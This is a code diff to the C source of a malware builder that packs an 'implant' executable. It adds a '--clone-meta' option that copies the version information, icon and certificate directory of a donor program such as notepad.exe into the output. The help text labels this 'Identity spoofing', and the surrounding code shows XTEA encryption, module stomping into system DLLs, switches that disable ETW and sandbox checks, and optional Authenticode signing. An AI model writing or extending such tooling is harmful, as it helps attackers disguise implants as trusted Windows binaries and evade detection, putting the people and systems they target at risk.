@@ -27,6 +27,7 @@
 #include "..\Engine\Xtea.h"
 #include "..\Engine\OpsecFlags.h"
 #include "PeSigning.h"
+#include "CloneMeta.h"
 
 #pragma comment(lib, "Crypt32.lib")
 
@@ -174,6 +175,7 @@ typedef struct {
     const char* pfxPath;          /* --pfx       — NULL = no signing                  */
     const char* pfxPass;          /* --pfx-pass  — NULL = no password (or empty PFX)  */
     const char* tsUrl;            /* --ts-url    — NULL = sign without timestamp      */
+    const char* cloneMetaPath;    /* --clone-meta — NULL = no identity cloning        */
 } BUILD_CONFIG;
 
 static void BuildConfig_Defaults(BUILD_CONFIG* cfg) {
@@ -194,6 +196,7 @@ static void BuildConfig_Defaults(BUILD_CONFIG* cfg) {
     cfg->pfxPath          = NULL;
     cfg->pfxPass          = NULL;
     cfg->tsUrl            = NULL;
+    cfg->cloneMetaPath    = NULL;
 }
 
 /* -------------------------------------------------------------------------
@@ -290,6 +293,19 @@ static BOOL ParseArgs(int argc, char* argv[], BUILD_CONFIG* cfg) {
         else if (_stricmp(argv[i], "--ts-url") == 0 && i + 1 < argc) {
             cfg->tsUrl = argv[++i];
         }
+        else if (_stricmp(argv[i], "--clone-meta") == 0 && i + 1 < argc) {
+            cfg->cloneMetaPath = argv[++i];
+            /* Fail fast if donor does not exist — avoids a silent no-op at Phase 11. */
+            {
+                HANDLE hTest = CreateFileA(cfg->cloneMetaPath, GENERIC_READ, FILE_SHARE_READ,
+                                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (hTest == INVALID_HANDLE_VALUE) {
+                    fprintf(stderr, "[!] --clone-meta: file not found or unreadable: %s\n", cfg->cloneMetaPath);
+                    return FALSE;
+                }
+                CloseHandle(hTest);
+            }
+        }
         else {
             printf("[!] Unknown option: %s\n", argv[i]);
             return FALSE;
@@ -344,7 +360,7 @@ static void PrintUsage(void) {
     PrintDisableGroup(DGROUP_SANDBOX);
     printf("    %-11s %s\n", "all", "Disable every token listed above");
     printf("\n");
-    printf("Authenticode signing (via mssign32!SignerSignEx2, no signtool dependency):\n");
+    printf("Identity spoofing:\n");
     printf("  --pfx <path>               PFX certificate container to sign the output with\n");
     printf("  --pfx-pass <password>      PFX passphrase  [omit if PFX has no password]\n");
     printf("  --ts-url <url>             RFC 3161 timestamp URL  [default: no timestamping]\n");
@@ -354,6 +370,14 @@ static void PrintUsage(void) {
     printf("                             Common URLs: http://timestamp.digicert.com\n");
     printf("                                          http://timestamp.sectigo.com\n");
     printf("                                          http://timestamp.globalsign.com/tsa/r6advanced1\n");
+    printf("  --clone-meta <donor.exe>   Clone VERSIONINFO, icon, and cert directory from donor PE.\n");
+    printf("                             Explorer 'Digital Signatures' shows donor's signer;\n");
+    printf("                             Get-AuthenticodeSignature returns HashMismatch.\n");
+    printf("                             Defeats visual inspection only — any signature verifier\n");
+    printf("                             (signtool, WinVerifyTrust, AV) detects the mismatch.\n");
+    printf("                             Name output to match donor OriginalFilename field.\n");
+    printf("                             When combined with --pfx: real signature overwrites\n");
+    printf("                             cloned cert; VERSIONINFO and icon are preserved.\n");
     printf("\n");
     printf("Examples:\n");
     printf("  Builder.exe implant.exe     packed.exe\n");
@@ -363,6 +387,8 @@ static void PrintUsage(void) {
     printf("  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls\n");
     printf("  Builder.exe implant.exe     packed.exe --pfx cert.pfx --pfx-pass hunter2\n");
     printf("  Builder.exe implant.exe     packed.exe --pfx cert.pfx --ts-url http://timestamp.digicert.com\n");
+    printf("  Builder.exe implant.exe     notepad.exe --clone-meta C:\\Windows\\System32\\notepad.exe\n");
+    printf("  Builder.exe implant.exe     notepad.exe --clone-meta notepad.exe --pfx self.pfx\n");
 }
 
 int main(int argc, char* argv[]) {
@@ -543,7 +569,7 @@ int main(int argc, char* argv[]) {
   }
   SecureZeroMemory(cfg.exportName, sizeof(cfg.exportName));
 
-  printf("[*] Phase 7b: XTEA outer encryption...\n");
+  printf("[*] Phase 8: XTEA outer encryption...\n");
   DWORD xteaKey[4];
   Xtea_DeriveKey(xteaKey, key_salt);
   Xtea_Crypt(mutated.pBuffer, mutated.totalSize, xteaKey);
@@ -554,7 +580,7 @@ int main(int argc, char* argv[]) {
   /* Zero XTEA key from stack — key_salt is still needed for BuildInfectedPE */
   SecureZeroMemory(xteaKey, sizeof(xteaKey));
 
-  /* STEP 7c: Verify that at least one preset DLL has an executable section
+  /* STEP 9: Verify that at least one preset DLL has an executable section
    *           large enough to hold the final payload blob.
    *
    * This is a Builder-side sanity check only — Stub handles the failure
@@ -583,7 +609,7 @@ int main(int argc, char* argv[]) {
           "bcrypt.dll",       /* 9 — CRYPTO  */
       };
 
-      printf("[*] Phase 7c: Verifying preset DLL section sizes...\n");
+      printf("[*] Phase 9: Verifying preset DLL section sizes...\n");
 
       int anyFit = 0;
       for (int i = 0; i < 3; i++) {
@@ -639,8 +665,8 @@ int main(int argc, char* argv[]) {
       }
   }
 
-  /* STEP 8: Building Final PE */
-  printf("[*] Phase 8: Building Final PE...\n");
+  /* STEP 10: Building Final PE */
+  printf("[*] Phase 10: Building Final PE...\n");
   printf("[*] Module-stomp preset: DLL pool indices [%u, %u, %u]\n",
          cfg.dll_indices[0], cfg.dll_indices[1], cfg.dll_indices[2]);
   BOOL bBuildOk = BuildInfectedPE(cfg.stubPath, cfg.outputPath,
@@ -655,11 +681,24 @@ int main(int argc, char* argv[]) {
                                   cfg.hammerMs,
                                   cfg.opsecFlags);
 
-  /* STEP 9: Optional Authenticode signing — must come AFTER BuildInfectedPE
-   * because signing rewrites the PE security directory and recalculates the
-   * checksum; any further resource edits would invalidate the signature. */
+  /* STEP 11: Optional metadata cloning — must come AFTER BuildInfectedPE (Phase 10)
+   * because BeginUpdateResource in Phase 10 rewrites the entire .rsrc section,
+   * erasing any resources written earlier.  Must come BEFORE SignPeWithPfx (Phase 12)
+   * so that the real signature can overwrite the cloned cert directory. */
+  if (bBuildOk && cfg.cloneMetaPath) {
+      printf("[*] Phase 11: Cloning metadata from %s\n", cfg.cloneMetaPath);
+      int cloneRes = CloneMeta_Apply(cfg.outputPath, cfg.cloneMetaPath);
+      if (cloneRes != 0) {
+          fprintf(stderr, "[-] Metadata cloning failed (code %d)\n", cloneRes);
+          bBuildOk = FALSE;
+      }
+  }
+
+  /* STEP 12: Optional Authenticode signing — must come AFTER BuildInfectedPE (Phase 10)
+   * and CloneMeta (Phase 11): signing rewrites the SECURITY directory and recalculates
+   * the checksum; any further resource edits would invalidate the real signature. */
   if (bBuildOk && cfg.pfxPath) {
-      printf("[*] Phase 9: Authenticode signing (PFX: %s%s)\n",
+      printf("[*] Phase 12: Authenticode signing (PFX: %s%s)\n",
              cfg.pfxPath,
              cfg.tsUrl ? ", with RFC 3161 timestamp" : ", no timestamp");
       if (SignPeWithPfx(cfg.outputPath, cfg.pfxPath, cfg.pfxPass, cfg.tsUrl)) {
